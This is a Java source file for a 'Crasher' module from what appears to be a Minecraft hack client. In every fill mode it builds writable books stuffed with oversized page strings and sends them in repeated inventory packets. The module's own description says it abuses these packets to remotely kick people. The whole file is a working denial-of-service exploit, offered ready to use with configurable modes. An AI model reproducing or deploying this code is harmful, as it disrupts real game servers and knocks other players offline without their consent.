package bleach.a32k.module.modules;

import bleach.a32k.module.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import net.minecraft.inventory.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;
import java.util.stream.*;
import bleach.a32k.settings.*;
import java.util.*;

public class Crasher extends Module
{
    private static final List<SettingBase> settings;
    
    public Crasher() {
        super("Crasher", 0, Category.EXPLOITS, "Abuses book and quill packets to remotely kick people.", Crasher.settings);
    }
    
    @Override
    public void onUpdate() {
        final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = "Bleach";
        final String title = "\n Ruhama Owns All \n";
        String size = "";
        if (this.getSettings().get(2).toMode().mode == 2) {
            final IntStream chars = new Random().ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            size = chars.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
        }
        else if (this.getSettings().get(2).toMode().mode == 1) {
            size = repeat(5000, String.valueOf(1114111));
        }
        else if (this.getSettings().get(2).toMode().mode == 0) {
            final IntStream chars = new Random().ints(32, 126);
            size = chars.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
        }
        else if (this.getSettings().get(2).toMode().mode == 3) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }
        for (int j = 0; j < 50; ++j) {
            final String siteContent = size;
            final NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        bookObj.setTagInfo("pages", list);
        bookObj.setTagCompound(tag);
        for (int j = 0; j < this.getSettings().get(1).toSlider().getValue(); ++j) {
            if (this.getSettings().get(0).toMode().mode == 0) {
                this.mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
            }
            else {
                this.mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
            }
        }
    }
    
    private static String repeat(final int count, final String with) {
        return new String(new char[count]).replace("\u0000", with);
    }
    
    static {
        settings = Arrays.asList(new SettingMode("Mode: ", "Jessica", "Raion"), new SettingSlider(1.0, 20.0, 5.0, 0, "Uses: "), new SettingMode("Fill: ", "Ascii", "0xFFFF", "Random", "Old"));
    }
}
